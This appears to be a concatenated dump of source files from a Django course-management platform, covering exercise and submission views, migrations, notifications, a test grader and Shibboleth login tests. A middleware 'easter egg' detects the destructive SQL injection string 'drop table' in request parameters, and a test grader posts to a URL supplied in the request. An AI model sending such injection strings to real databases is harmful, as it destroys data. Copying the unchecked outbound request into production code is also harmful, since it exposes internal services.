CourseModule.STATUS.MAINTENANCE):\n            if self.is_course_staff:\n                issue = _(\"Exercise is in maintenance and content is hidden \"\n                          \"from students.\")\n                messages.error(request, issue)\n                issues.append(issue)\n            else:\n                page = ExercisePage(self.exercise)\n                page.content = _('Unfortunately this exercise is currently '\n                                 'under maintenance.')\n                return super().get(request, *args, page=page, students=students, **kwargs)\n\n        if hasattr(self.exercise, 'generate_table_of_contents') \\\n              and self.exercise.generate_table_of_contents:\n            self.toc = self.content.children_hierarchy(self.exercise)\n            self.note(\"toc\")\n\n        page = self.exercise.as_leaf_class().load(request, students,\n            url_name=self.post_url_name)\n\n        if self.profile:\n            LearningObjectDisplay.objects.create(learning_object=self.exercise, profile=self.profile)\n\n        if isinstance(self.exercise, ExerciseCollection):\n            exercisecollection, exercisecollection_title = self.__load_exercisecollection(request)\n\n        return super().get(request,\n                           *args,\n                           page=page,\n                           students=students,\n                           submission_allowed=submission_allowed,\n                           disable_submit=disable_submit,\n                           should_enroll=should_enroll,\n                           issues=issues,\n                           exercisecollection=exercisecollection,\n                           exercisecollection_title=exercisecollection_title,\n                           **kwargs)\n\n    def post(self, request, *args, **kwargs):\n        # Stop submit trials for e.g. chapters.\n        # However, allow posts from exercises switched to maintenance status.\n        if not self.exercise.is_submittable:\n            return self.http_method_not_allowed(request, *args, **kwargs)\n\n        new_submission = None\n        page = ExercisePage(self.exercise)\n        submission_status, submission_allowed, issues, students = (\n            self.submission_check(True, request)\n        )\n        if submission_allowed:\n            new_submission = Submission.objects.create_from_post(\n                self.exercise, students, request)\n            if new_submission:\n                page = self.exercise.grade(request, new_submission,\n                    url_name=self.post_url_name)\n\n                # Enroll after succesfull enrollment exercise.\n                if self.exercise.status in (\n                    LearningObject.STATUS.ENROLLMENT,\n                    LearningObject.STATUS.ENROLLMENT_EXTERNAL,\n                ) and new_submission.status == Submission.STATUS.READY:\n                    self.instance.enroll_student(self.request.user)\n\n                # Redirect non AJAX normally to submission page.\n                if not request.is_ajax() and \"__r\" not in request.GET:\n                    return self.redirect(new_submission.get_absolute_url() +\n                        (\"?wait=1\" if page.is_wait else \"\"))\n            else:\n                messages.error(request,\n                    _(\"The submission could not be saved for some reason. \"\n                      \"The submission was not registered.\"))\n\n            # Redirect non AJAX content page request back.\n            if not request.is_ajax() and \"__r\" in request.GET:\n                return self.redirect(request.GET[\"__r\"], backup=self.exercise);\n\n        self.get_summary_submissions()\n        return self.response(page=page, students=students,\n            submission=new_submission)\n\n    def submission_check(self, error=False, request=None):\n        if not self.profile:\n            issue = _(\"You need to sign in and enroll to submit exercises.\")\n            messages.error(self.request, issue)\n            return self.exercise.SUBMIT_STATUS.INVALID, False, [issue], []\n        submission_status, issues, students = (\n            self.exercise.check_submission_allowed(self.profile, request)\n        )\n        if len(issues) > 0:\n            if error:\n                messages.error(self.request, \"\\n\".join(issues))\n            else:\n                messages.warning(self.request, \"\\n\".join(issues))\n        submission_allowed = (\n            submission_status == self.exercise.SUBMIT_STATUS.ALLOWED\n        )\n        return submission_status, submission_allowed, issues, students\n\n\n    def __load_exercisecollection(self, request):\n        user = self.profile.user\n\n        if user.is_authenticated():\n            self.exercise.check_submission(user, no_update=True)\n\n        target_exercises = []\n        for t_exercise in self.exercise.exercises:\n            it = t_exercise.parent\n            ex_url = it.url\n            it = it.parent\n            while it is not None:\n                ex_url = it.url + '/' + ex_url\n                it = it.parent\n\n            ex_name = t_exercise.name\n            for candidate in t_exercise.name.split('|'):\n                if request.LANGUAGE_CODE in candidate:\n                    ex_name = candidate[len('{}:'.format(request.LANGUAGE_CODE)):]\n\n            data = {\"exercise\": t_exercise,\n                    \"url\": reverse(\"exercise\", kwargs={\n                        \"course_slug\": t_exercise.course_module.course_instance.course.url,\n                        \"instance_slug\": t_exercise.course_module.course_instance.url,\n                        \"module_slug\": t_exercise.course_module.url,\n                        \"exercise_path\": ex_url,\n                    }),\n                    \"title\": ex_name,\n                    \"max_points\": t_exercise.max_points,\n                    \"user_points\": UserExerciseSummary(t_exercise, request.user).get_points(),\n                    }\n            target_exercises.append(data)\n\n        title = \"{}: {} - {}\".format(t_exercise.course_module.course_instance.course.name,\n                                     t_exercise.course_module.course_instance.instance_name,\n                                     t_exercise.category.name)\n\n        return target_exercises, title\n\n\nclass ExercisePlainView(ExerciseView):\n    raise_exception=True\n    force_ajax_template=True\n    post_url_name=\"exercise-plain\"\n\n    # Allow form posts without the cross-site-request-forgery key.\n    # Allow iframe in another domain.\n    @method_decorator(csrf_exempt)\n    @method_decorator(xframe_options_exempt)\n    def dispatch(self, request, *args, **kwargs):\n        return super().dispatch(request, *args, **kwargs)\n\n\nclass ExerciseModelView(ExerciseModelBaseView):\n    template_name = \"exercise/model.html\"\n    ajax_template_name = \"exercise/_model_files.html\"\n    access_mode = ACCESS.ENROLLED\n\n    def get_common_objects(self):\n        super().get_common_objects()\n        self.get_summary_submissions()\n        self.models = []\n        for url,name in self.exercise.get_models():\n            try:\n                response = request_for_response(url)\n            except RemotePageNotFound:\n                self.models.append({'name': name})\n            else:\n                self.models.append({\n                    'name': name,\n                    'content': response.text,\n                    'html': 'text/html' in response.headers.get('Content-Type'),\n                })\n        self.note('models')\n\n\nclass ExerciseTemplateView(ExerciseTemplateBaseView):\n    template_name = \"exercise/template.html\"\n    ajax_template_name = \"exercise/_template_files.html\"\n    access_mode = ACCESS.ENROLLED\n\n    def get_common_objects(self):\n        super().get_common_objects()\n        self.get_summary_submissions()\n        self.templates = []\n        for url,name in self.exercise.get_templates():\n            response = request_for_response(url)\n            self.templates.append({\n                'name': name,\n                'content': response.text,\n                'html': 'text/html' in response.headers.get('Content-Type'),\n            })\n        self.note('templates')\n\n\nclass SubmissionView(SubmissionBaseView):\n    template_name = \"exercise/submission.html\"\n    ajax_template_name = \"exercise/submission_plain.html\"\n\n    def get_common_objects(self):\n        super().get_common_objects()\n        self.page = { \"is_wait\": \"wait\" in self.request.GET }\n        self.note(\"page\")\n        #if not self.request.is_ajax():\n        self.get_summary_submissions()\n\n\nclass SubmissionPlainView(SubmissionView):\n    raise_exception=True\n    force_ajax_template=True\n\n    # Allow iframe in another domain.\n    @method_decorator(xframe_options_exempt)\n    def dispatch(self, request, *args, **kwargs):\n        return super().dispatch(request, *args, **kwargs)\n\n\nclass SubmissionPollView(SubmissionMixin, BaseView):\n\n    def get(self, request, *args, **kwargs):\n        return HttpResponse(self.submission.status, content_type=\"text/plain\")\n\n\nclass SubmittedFileView(SubmissionMixin, BaseView):\n    file_kw = \"file_id\"\n    file_name_kw = \"file_name\"\n\n    def get_resource_objects(self):\n        super().get_resource_objects()\n        file_id = self._get_kwarg(self.file_kw)\n        file_name = self._get_kwarg(self.file_name_kw)\n        self.file = get_object_or_404(\n            SubmittedFile,\n            id=file_id,\n            submission=self.submission\n        )\n        if self.file.filename != file_name:\n            raise Http404()\n\n    def get(self, request, *args, **kwargs):\n        with open(self.file.file_object.path, \"rb\") as f:\n            bytedata = f.read()\n\n        # Download the file.\n        if request.GET.get(\"download\", False):\n            response = HttpResponse(bytedata,\n                content_type=\"application/octet-stream\")\n            response[\"Content-Disposition\"] = 'attachment; filename=\"{}\"'\\\n                .format(self.file.filename)\n            return response\n\n        if self.file.is_passed():\n            return HttpResponse(bytedata, content_type=self.file.get_mime())\n\n        return HttpResponse(bytedata.decode('utf-8', 'ignore'),\n            content_type='text/plain; charset=\"UTF-8\"')\n/n/n/n/external_services/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\n\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('inheritance', '0001_initial'),\n        ('course', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='LinkService',\n            fields=[\n                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),\n                ('url', models.CharField(help_text=b'The service URL', max_length=256)),\n                ('menu_label', models.CharField(help_text=b'A default label to show in the course menu.', max_length=32)),\n                ('menu_icon_class', models.CharField(default=b'icon-globe', help_text=b'A default menu icon style name, see http://getbootstrap.com/components/#glyphicons-glyphs', max_length=32)),\n                ('enabled', models.BooleanField(default=True, help_text=b'If not enabled, the service is disabled for all course instances.')),\n            ],\n            options={\n                'ordering': ['menu_label'],\n            },\n            bases=('inheritance.modelwithinheritance',),\n        ),\n        migrations.CreateModel(\n            name='LTIService',\n            fields=[\n                ('linkservice_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='external_services.LinkService')),\n                ('consumer_key', models.CharField(help_text=b'The consumer key provided by the LTI service.', max_length=128)),\n                ('consumer_secret', models.CharField(help_text=b'The consumer secret provided by the LTI service.', max_length=128)),\n            ],\n            options={\n            },\n            bases=('external_services.linkservice',),\n        ),\n        migrations.CreateModel(\n            name='MenuItem',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('menu_label', models.CharField(help_text=b'Overrides service default label shown in the course menu.', max_length=32, null=True, blank=True)),\n                ('menu_icon_class', models.CharField(help_text=b'Overrides service default menu icon style, e.g. icon-star see http://getbootstrap.com/components/#glyphicons-glyphs', max_length=32, null=True, blank=True)),\n                ('menu_weight', models.IntegerField(default=0, help_text=b'Heavier menu entries are placed after lighter ones.')),\n                ('enabled', models.BooleanField(default=True)),\n                ('course_instance', models.ForeignKey(related_name='ext_services', to='course.CourseInstance', help_text=b'A course instance where the service is used.')),\n                ('service', models.ForeignKey(to='external_services.LinkService')),\n            ],\n            options={\n                'ordering': ['course_instance', 'menu_weight', 'menu_label'],\n            },\n            bases=(models.Model,),\n        ),\n    ]\n/n/n/n/external_services/migrations/0002_auto_20150427_1717.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('external_services', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.AlterField(\n            model_name='linkservice',\n            name='enabled',\n            field=models.BooleanField(help_text='If not enabled, the service is disabled for all course instances.', default=True),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='linkservice',\n            name='menu_icon_class',\n            field=models.CharField(help_text='A default menu icon style name, see http://getbootstrap.com/components/#glyphicons-glyphs', default='icon-globe', max_length=32),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='linkservice',\n            name='menu_label',\n            field=models.CharField(help_text='A default label to show in the course menu.', max_length=32),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='linkservice',\n            name='url',\n            field=models.CharField(help_text='The service URL', max_length=256),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='ltiservice',\n            name='consumer_key',\n            field=models.CharField(help_text='The consumer key provided by the LTI service.', max_length=128),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='ltiservice',\n            name='consumer_secret',\n            field=models.CharField(help_text='The consumer secret provided by the LTI service.', max_length=128),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='course_instance',\n            field=models.ForeignKey(related_name='ext_services', help_text='A course instance where the service is used.', to='course.CourseInstance'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='menu_icon_class',\n            field=models.CharField(null=True, blank=True, help_text='Overrides service default menu icon style, e.g. icon-star see http://getbootstrap.com/components/#glyphicons-glyphs', max_length=32),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='menu_label',\n            field=models.CharField(null=True, blank=True, help_text='Overrides service default label shown in the course menu.', max_length=32),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='menu_weight',\n            field=models.IntegerField(help_text='Heavier menu entries are placed after lighter ones.', default=0),\n            preserve_default=True,\n        ),\n    ]\n/n/n/n/external_services/migrations/0005_auto_20160829_1344.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('external_services', '0004_auto_20150828_1210'),\n    ]\n\n    operations = [\n        migrations.AddField(\n            model_name='menuitem',\n            name='menu_group_label',\n            field=models.CharField(blank=True, null=True, max_length=32, help_text='Places menu item under a group label.'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='menuitem',\n            name='menu_url',\n            field=models.CharField(blank=True, null=True, max_length=256, help_text='A link URL (else service default). Relative URLs are relative to course root.'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='course_instance',\n            field=models.ForeignKey(help_text='A course where the menu item exists.', to='course.CourseInstance', related_name='ext_services'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='menu_icon_class',\n            field=models.CharField(blank=True, null=True, max_length=32, help_text='Menu icon style name (else service default), e.g. star see http://getbootstrap.com/components/#glyphicons-glyphs'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='menu_label',\n            field=models.CharField(blank=True, null=True, max_length=32, help_text='Label for the menu link (else service default).'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='service',\n            field=models.ForeignKey(help_text='If preconfigured, an external service to link.', to='external_services.LinkService', null=True, blank=True),\n            preserve_default=True,\n        ),\n    ]\n/n/n/n/inheritance/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\n\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('contenttypes', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='ModelWithInheritance',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('content_type', models.ForeignKey(editable=False, to='contenttypes.ContentType', null=True)),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=(models.Model,),\n        ),\n    ]\n/n/n/n/lib/email_messages.py/n/nimport logging\nimport traceback\nfrom django.conf import settings\nfrom django.core.mail import send_mail\nfrom django.core.urlresolvers import reverse\n\nlogger = logging.getLogger('lib.email_messages')\n\n\ndef email_course_error(request, exercise, message, exception=True):\n    \"\"\"\n    Sends error message to course teachers or technical support emails if set.\n    \"\"\"\n    instance = exercise.course_instance\n    if instance.technical_error_emails:\n        recipients = instance.technical_error_emails.split(\",\")\n    else:\n        recipients = (p.user.email for p in instance.course.teachers.all() if p.user.email)\n\n    error_trace = \"-\"\n    if exception:\n        error_trace = traceback.format_exc()\n\n    subject = settings.EXERCISE_ERROR_SUBJECT.format(\n        course=instance.course.code,\n        exercise=str(exercise))\n    body = settings.EXERCISE_ERROR_DESCRIPTION.format(\n        message=message,\n        exercise_url=request.build_absolute_uri(\n            exercise.get_absolute_url()),\n        course_edit_url=request.build_absolute_uri(\n            instance.get_url('course-details')),\n        error_trace=error_trace,\n        request_fields=repr(request))\n    if recipients:\n        try:\n            send_mail(subject, body, settings.SERVER_EMAIL, recipients, True)\n        except Exception as e:\n            logger.exception('Failed to send error emails.')\n/n/n/n/lib/middleware.py/n/n\"\"\"\nThis middleware is an easter egg! It is invoked when any request parameters\ncontain the string \"drop table\" (a potential SQL injection) and prevents the\nuser from loading any pages. Instead, a response with internal server error code\nis returned with a \"funny\" error message. The SQL injection attempt is stored in\nthe session, so that the problem persists even if the user reloads the page.\nOther users and the actual system are not affected by this middleware.\n\nThe normal behavior can be restored by giving any request parameter value with the\nstring \"restore table\" in it.\n\"\"\"\n\nfrom django.http import HttpResponseServerError\n\nclass SqlInjectionMiddleware(object):\n\n    def process_request(self, request):\n        for var in request.GET:\n            val = request.GET.get(var).lower()\n            if \"drop table\" in val:\n                request.session[\"hack_attempt\"] = val\n            if \"restore table\" in val and \"hack_attempt\" in request.session:\n                del request.session[\"hack_attempt\"]\n\n        if \"hack_attempt\" in request.session:\n            return HttpResponseServerError(\"Traceback (most recent call last):\\nFile \\\"egg.py\\\", line 1337, in aplus\\nDatabaseIntegrityError: aHR0cDovL3hrY2QuY29tLzMyNy8= is not a valid base64 table identifier\", content_type=\"text/plain\")\n\n        return None\n/n/n/n/news/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport lib.models\nimport django.utils.timezone\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('course', '0028_auto_20160825_0601'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='News',\n            fields=[\n                ('id', models.AutoField(serialize=False, primary_key=True, auto_created=True, verbose_name='ID')),\n                ('audience', models.IntegerField(choices=[(1, 'Internal users'), (2, 'External users'), (3, 'Internal and external users')], default=3)),\n                ('publish', models.DateTimeField(default=django.utils.timezone.now)),\n                ('title', models.CharField(max_length=255)),\n                ('body', models.TextField()),\n                ('pin', models.BooleanField(default=False)),\n                ('alert', models.CharField(choices=[('', 'No alert'), ('danger', 'Red / Danger'), ('info', 'Blue / Info'), ('success', 'Green / Success'), ('warning', 'Yellow / Warning')], max_length=8, blank=True, default='')),\n                ('course_instance', models.ForeignKey(to='course.CourseInstance', related_name='news')),\n            ],\n            options={\n                'ordering': ['course_instance', '-pin', '-publish'],\n            },\n            bases=(models.Model, lib.models.UrlMixin),\n        ),\n    ]\n/n/n/n/news/templatetags/news.py/n/nfrom django import template\nfrom django.utils import timezone\n\nfrom lib.errors import TagUsageError\nfrom ..cache import CachedNews\nfrom ..models import News\n\n\nregister = template.Library()\n\n\n@register.inclusion_tag(\"news/user_news.html\", takes_context=True)\ndef user_news(context, num, more=0):\n    if not 'instance' in context:\n        raise TagUsageError()\n    if not 'now' in context:\n        context['now'] = timezone.now()\n    if not 'course_news' in context:\n        context['course_news'] = CachedNews(context['instance'])\n    news = context['course_news']\n\n    if context['is_course_staff']:\n        alerts,news = news.for_staff()\n    else:\n        user = context['request'].user\n        alerts,news = news.for_user(\n            not user.is_authenticated()\n            or user.userprofile.is_external\n        )\n\n    i = 0\n    for item in news:\n        i += 1\n        item['collapsed'] = i > num\n        if more > 0 and i == more:\n            item['begin_more'] = True\n\n    return {\n        'is_course_staff': context['is_course_staff'],\n        'now': context['now'],\n        'alerts': alerts,\n        'news': news,\n        'more': more,\n    }\n\n\n@register.filter\ndef is_published(entry, now):\n    return entry['publish'] <= now\n\n\n@register.filter\ndef news_audience(audience):\n    return News.AUDIENCE[audience]\n/n/n/n/notification/cache.py/n/nfrom django.db.models.signals import post_save, post_delete\n\nfrom lib.cache import CachedAbstract\nfrom .models import Notification\n\n\nclass CachedNotifications(CachedAbstract):\n    KEY_PREFIX = \"notifications\"\n\n    def __init__(self, user):\n        super().__init__(user)\n\n    def _generate_data(self, user, data=None):\n        if not user or not user.is_authenticated():\n            return {\n                'count': 0,\n                'notifications': [],\n            }\n\n        def notification_entry(n):\n            exercise = n.submission.exercise if n.submission else None\n            return {\n                'id': n.id,\n                'submission_id': n.submission.id if n.submission else 0,\n                'name': \"{} {}, {}\".format(\n                    n.course_instance.course.code,\n                    (str(exercise.parent)\n                        if exercise and exercise.parent else\n                     n.course_instance.instance_name),\n                    (str(exercise)\n                        if exercise else\n                     n.subject),\n                ),\n                'link': n.get_display_url(),\n            }\n\n        notifications = list(\n            user.userprofile.received_notifications\\\n                .filter(seen=False)\\\n                .select_related(\n                    'submission',\n                    'submission__exercise',\n                    'course_instance',\n                    'course_instance__course',\n                )\n        )\n        return {\n            'count': len(notifications),\n            'notifications': [notification_entry(n) for n in notifications],\n        }\n\n    def count(self):\n        return self.data['count']\n\n    def notifications(self):\n        return self.data['notifications']\n\n\ndef invalidate_notifications(sender, instance, **kwargs):\n    CachedNotifications.invalidate(instance.recipient.user)\n\n\n# Automatically invalidate cache when notifications change.\npost_save.connect(invalidate_notifications, sender=Notification)\npost_delete.connect(invalidate_notifications, sender=Notification)\n/n/n/n/notification/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\n\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('userprofile', '0001_initial'),\n        ('course', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='Notification',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('subject', models.CharField(max_length=255)),\n                ('notification', models.TextField()),\n                ('timestamp', models.DateTimeField(auto_now_add=True)),\n                ('seen', models.BooleanField(default=False)),\n                ('course_instance', models.ForeignKey(to='course.CourseInstance')),\n                ('recipient', models.ForeignKey(related_name='received_notifications', to='userprofile.UserProfile')),\n                ('sender', models.ForeignKey(related_name='sent_notifications', to='userprofile.UserProfile')),\n            ],\n            options={\n                'ordering': ['-timestamp'],\n            },\n            bases=(models.Model,),\n        ),\n    ]\n/n/n/n/notification/migrations/0002_auto_20160912_1341.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0022_auto_20160906_1401'),\n        ('notification', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.AddField(\n            model_name='notification',\n            name='submission',\n            field=models.ForeignKey(to='exercise.Submission', blank=True, null=True),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='notification',\n            name='notification',\n            field=models.TextField(blank=True),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='notification',\n            name='sender',\n            field=models.ForeignKey(related_name='sent_notifications', to='userprofile.UserProfile', blank=True, null=True),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='notification',\n            name='subject',\n            field=models.CharField(blank=True, max_length=255),\n            preserve_default=True,\n        ),\n    ]\n/n/n/n/notification/migrations/0003_auto_20160914_1051.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('notification', '0002_auto_20160912_1341'),\n    ]\n\n    operations = [\n        migrations.AlterField(\n            model_name='notification',\n            name='submission',\n            field=models.ForeignKey(blank=True, related_name='notifications', null=True, to='exercise.Submission'),\n            preserve_default=True,\n        ),\n    ]\n/n/n/n/selenium_test/grader/exercises/views.py/n/nfrom django.http import HttpResponse\nfrom django.shortcuts import render\nfrom django.core.urlresolvers import reverse\n\n\ndef first(request):\n\n    if request.method == \"POST\":\n        submission = request.POST.get(\"answer\", \"\").lower()\n        points = 0\n        if 'hello' in submission:\n            points += 1\n        if 'a+' in submission:\n            points += 1\n        return render(request, \"exercises/first_result.html\", {\n            \"points\": points,\n            \"max_points\": 2,\n        })\n\n    return render(request, \"exercises/first_exercise.html\")\n\n\ndef file(request):\n\n    if request.method == \"POST\":\n        if \"myfile\" in request.FILES and request.FILES[\"myfile\"].name:\n            status = \"accepted\"\n        else:\n            status = \"error\"\n        return render(request, \"exercises/file_result.html\", {\n            \"status\": status,\n        })\n\n    return render(request, \"exercises/file_exercise.html\")\n\n\ndef ajax(request):\n\n    def parse_int(s):\n        try:\n            return int(s)\n        except Exception:\n            return 0\n\n    if request.method == \"POST\":\n        points = parse_int(request.POST.get(\"points\"))\n        max_points = parse_int(request.POST.get(\"max_points\"))\n        url = request.GET.get(\"submission_url\")\n\n        def respond_text(text):\n            response = HttpResponse(text)\n            response[\"Access-Control-Allow-Origin\"] = \"*\"\n            return response\n\n        if not url:\n            return respond_text('{ \"errors\": [\"Missing submission_url\"] }')\n\n        import requests\n        response = requests.post(url, timeout=3, data={\n            \"points\": points,\n            \"max_points\": max_points,\n            \"feedback\": \"You got {} / {} points for your answer.\".format(points, max_points),\n            \"grading_payload\": \"{}\",\n        })\n        return respond_text(response.text)\n\n    return render(request, \"exercises/ajax_exercise.html\", {\n        \"url\": request.build_absolute_uri(\"{}?{}\".format(\n            reverse(\"ajax\"), request.META.get(\"QUERY_STRING\", \"\")\n        )),\n    })\n/n/n/n/shibboleth_login/tests.py/n/nimport urllib.parse\n\nfrom django.conf import settings\nfrom django.contrib.auth.models import User\nfrom django.core.urlresolvers import reverse\nfrom django.test import TestCase, modify_settings\nfrom django.utils import timezone\n\n\nDEF_SHIBD_META = {\n    'SHIB_cn': 'Teemu Teekkari',\n    'SHIB_mail': 'teemu.teekkari@aalto.fi',\n    'Shib-Authentication-Method': 'urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport',\n    'Shib-Identity-Provider': 'https://locahost/idp/shibboleth',\n    'SHIB_displayName': 'Teemudemus',\n    'Shib-AuthnContext-Class': 'urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport',\n    'SHIB_schacPersonalUniqueCode': 'urn:mace:terena.org:schac:personalUniqueCode:int:studentID:aalto.fi:123453',\n    'Shib-Session-Index': '_941d95bafed0b1787c81541e627a8c8b',\n    'SHIB_sn': 'Teekkari',\n    'SHIB_givenName': 'Teemu',\n    'Shib-Application-ID': 'default',\n    'Shib-Authentication-Instant': str(timezone.now()),\n    'Shib-Session-ID': '_92d7c6a832b5c7dafea59ea12ca1289e',\n    'SHIB_preferredLanguage': 'fi',\n    'SHIB_logouturl': 'https://localhost/idp/aalto_logout.jsp',\n    'SHIB_eppn': 'teekkarit@aalto.fi',\n}\n\n@modify_settings(\n    INSTALLED_APPS={'append': 'shibboleth_login'},\n    AUTHENTICATION_BACKENDS={'append': 'shibboleth_login.auth_backend.ShibbolethAuthBackend'},\n)\nclass ShibbolethTest(TestCase):\n\n    def setUp(self):\n        self.user = User(\n            username='meikalm8@aalto.fi',\n            email='',\n            first_name='Matti',\n            last_name='Sukunimi',\n        )\n        self.user.set_unusable_password()\n        self.user.save()\n        self.user.userprofile.student_id = '000'\n        self.user.userprofile.save()\n\n        self.login_url = reverse('shibboleth-login')\n\n    def test_invalid(self):\n        meta = DEF_SHIBD_META.copy()\n        del meta['SHIB_eppn']\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 403)\n        self.assertEqual(User.objects.count(), 1)\n\n    def test_valid_new(self):\n        meta = DEF_SHIBD_META.copy()\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(User.objects.count(), 2)\n        user = User.objects.get(username='teekkarit@aalto.fi')\n        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')\n        self.assertEqual(user.first_name, 'Teemu')\n        self.assertEqual(user.last_name, 'Teekkari')\n        self.assertEqual(user.userprofile.student_id, '123453')\n\n    def test_without_email(self):\n        meta = DEF_SHIBD_META.copy()\n        del meta['SHIB_mail']\n        del meta['SHIB_givenName']\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(User.objects.count(), 2)\n        user = User.objects.get(username='teekkarit@aalto.fi')\n        self.assertEqual(user.email, '{:d}@localhost'.format(user.id))\n        self.assertEqual(user.first_name, '')\n        self.assertEqual(user.last_name, 'Teekkari')\n        self.assertEqual(user.userprofile.student_id, '123453')\n\n    def test_without_student_id(self):\n        meta = DEF_SHIBD_META.copy()\n        del meta['SHIB_schacPersonalUniqueCode']\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(User.objects.count(), 2)\n        user = User.objects.get(username='teekkarit@aalto.fi')\n        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')\n        self.assertEqual(user.first_name, 'Teemu')\n        self.assertEqual(user.last_name, 'Teekkari')\n        self.assertEqual(user.userprofile.student_id, None)\n\n    def test_valid_old(self):\n        meta = DEF_SHIBD_META.copy()\n        meta['SHIB_eppn'] = self.user.username\n        del meta['SHIB_sn']\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(User.objects.count(), 1)\n        user = User.objects.first()\n        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')\n        self.assertEqual(user.first_name, 'Teemu')\n        self.assertEqual(user.last_name, 'Sukunimi')\n        self.assertEqual(user.userprofile.student_id, '123453')\n\n    def test_nonascii(self):\n        meta = DEF_SHIBD_META.copy()\n        meta['SHIB_eppn'] = self.user.username.encode('utf-8')\n        del meta['SHIB_givenName']\n        meta['SHIB_sn'] = 'Meik\u00e4l\u00e4inen'\n        del meta['SHIB_schacPersonalUniqueCode']\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(User.objects.count(), 1)\n        user = User.objects.first()\n        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')\n        self.assertEqual(user.first_name, 'Matti')\n        self.assertEqual(user.last_name, 'Meik\u00e4l\u00e4inen')\n        self.assertEqual(user.userprofile.student_id, '000')\n\n    def test_inactive(self):\n        self.user.is_active = False\n        self.user.save()\n        meta = DEF_SHIBD_META.copy()\n        meta['SHIB_eppn'] = self.user.username.encode('utf-8')\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 403)\n        self.assertEqual(User.objects.count(), 1)\n\n    def _get(self, meta):\n        if settings.SHIBBOLETH_VARIABLES_URL_ENCODED:\n            for key in meta.keys():\n                meta[key] = urllib.parse.quote(meta[key])\n        return self.client.generic('GET', self.login_url, **meta)\n/n/n/n/threshold/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('course', '0032_auto_20170215_0953'),\n        ('exercise', '0025_auto_20170215_0953'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='CourseModuleRequirement',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),\n                ('negative', models.BooleanField(default=False)),\n                ('module', models.ForeignKey(to='course.CourseModule', related_name='requirements')),\n            ],\n            options={\n            },\n            